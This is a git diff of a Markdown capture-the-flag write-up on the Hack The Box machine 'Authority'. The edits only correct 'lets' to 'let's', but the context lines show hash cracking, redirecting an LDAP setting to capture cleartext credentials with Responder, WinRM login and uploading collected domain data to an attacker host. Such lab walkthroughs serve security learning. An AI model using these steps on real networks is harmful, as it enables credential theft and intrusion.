@@ -25,13 +25,13 @@ PORT     STATE SERVICE       VERSION
 8443/tcp open  ssl/https-alt
 ```
 
-We have what looks like a domain controller. Lets add `authority.htb` to hosts:
+We have what looks like a domain controller. Let's add `authority.htb` to hosts:
 
 ```bash
 $ sudo bash -c "echo ${TARGET} authority.htb >> /etc/hosts"
 ```
 
-Starting from the top lets try a zone transfer.
+Starting from the top let's try a zone transfer.
 
 ```bash
 $ dig axfr @$TARGET authority.htb
@@ -42,7 +42,7 @@ $ dig axfr @$TARGET authority.htb
 ; Transfer failed.
 ```
 
-Doesn't work. Lets check the website on port 80.
+Doesn't work. Let's check the website on port 80.
 
 ```bash
 $ gobuster vhost -u authority.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o recon/vhostbust
@@ -347,7 +347,7 @@ $ /usr/share/john/ansible2john.py ldap_admin_password > hash
 $ hashcat --user hash /usr/share/wordlists/rockyou.txt
 ```
 
-Hashcat gives us the password of `!@#$%^&*` so lets decrypt the passwords:
+Hashcat gives us the password of `!@#$%^&*` so let's decrypt the passwords:
 
 ```bash
 $ ansible-vault view ldap_admin_password
@@ -385,7 +385,7 @@ Going over to the editor page we're greeted with a ton of options. Most interest
 
 ![ldap connection settings of the PWM application](Assets/ldap_connection_settings.jpg)
 
-Lets change the ldap url to point to our vm and start responder to see if we can snatch some creds.
+Let's change the ldap url to point to our vm and start responder to see if we can snatch some creds.
 
 ![The ldap connection address field after entering attacker vm ip](<Assets/change_ldap_url.jpg>)
 
@@ -397,7 +397,7 @@ $ sudo responder -I tun0
 [LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
 ```
 
-Great! After pressing the `Test LDAP Profile` we get some creds. Lets see if we can auth as the svc_ldap user.
+Great! After pressing the `Test LDAP Profile` we get some creds. Let's see if we can auth as the svc_ldap user.
 
 ```bash
 $ cme winrm $TARGET -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
@@ -406,7 +406,7 @@ HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985
 HTTP        10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
 ```
 
-Awesome, lets login using evil-winrm and run SharpHound and Winpeas to get some more information.
+Awesome, let's login using evil-winrm and run SharpHound + Winpeas to get some more information.
 
 ```bash
 $ py -m uploadserver
@@ -423,7 +423,7 @@ $ py -m uploadserver
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-FileUpload -File ./bloodHound.zip -Uri http://10.10.14.11:8000/upload
 ```
 
-The winpeas output looks rather mangled when viewing with less so lets print it out using powershell on linux:
+The winpeas output looks rather mangled when viewing with less so let's print it out using powershell on linux:
 
 ```powershell
 $ pwsh
